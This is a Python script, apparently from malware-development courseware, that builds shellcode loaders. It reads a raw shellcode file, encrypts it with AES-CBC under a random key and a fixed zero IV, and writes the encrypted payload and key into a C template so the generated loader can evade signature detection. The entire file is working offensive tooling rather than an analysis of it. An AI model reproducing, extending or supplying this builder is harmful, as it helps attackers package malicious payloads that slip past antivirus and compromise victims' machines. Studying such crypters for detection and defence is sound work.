# Adapted from SEKTOR7 malware dev courseware
# Original author: reenz0h (twitter: @SEKTOR7net)
# Requires pycryptodome

import sys
from base64 import b64encode
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad
from Cryptodome.Random import get_random_bytes
import hashlib
import argparse

def encrypt_AES(plaintext, KEY):
    # Initialize the cipher
    iv = 16 * b'\x00'
    cipher = AES.new(hashlib.sha256(KEY).digest(), AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))

    keystring = '0x' + ', 0x'.join(hex(x)[2:] for x in KEY)
    payloadstring = '0x' + ', 0x'.join(hex(x)[2:] for x in ciphertext)

    return keystring, payloadstring
    #with open('outfile.txt', 'w') as outfile:
    #    outfile.write(keystring)
    #    outfile.write(payloadstring)
    # print('AESkey[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in KEY) + ' };')
    # print('payload[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in ciphertext) + ' };')


def get_raw_sc(input_file):
    input_file = input_file
    file_shellcode = b''
    try:
        with open(input_file, 'rb') as shellcode_file:
            file_shellcode = shellcode_file.read()
            file_shellcode = file_shellcode.strip()
        return(file_shellcode)
    except FileNotFoundError:
        exit("\n\nThe input file you specified does not exist! Please specify a valid file path.\nExiting...\n")


def build_template(shellcode, shellcode_length, keystring):
    with open("aes_template.c") as tplate:
        template = tplate.read()
        template = template.replace("###SHELLCODE###", shellcode)
        template = template.replace("###KEY###", keystring)

    with open("aes.c", "w") as outfile:
        outfile.write(template)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--input", type=str,
                        help="File containing raw shellcode. Defaults to calc.bin.")

    if len(sys.argv) == 1:
        # No arguments received.  Print help and exit
        parser.print_help(sys.stderr)
        sys.exit(1)

    args = parser.parse_args()
    if args.input:
        input_file = args.input
    else:
        input_file = "calc.bin"

    # Generate a random key
    KEY = get_random_bytes(16)

    shellcode = get_raw_sc(input_file)
    keystring, encrypted_shellcode = encrypt_AES(shellcode, KEY)
    build_template(encrypted_shellcode, len(shellcode), keystring)

    original_shellcode = ""
    for byte in shellcode:
        original_shellcode = original_shellcode + str(hex(byte).zfill(2)) + ", "
    original_shellcode = original_shellcode.rstrip(', ')
    print("Original shellcode:")
    print(original_shellcode)


if __name__ == '__main__':
    main()
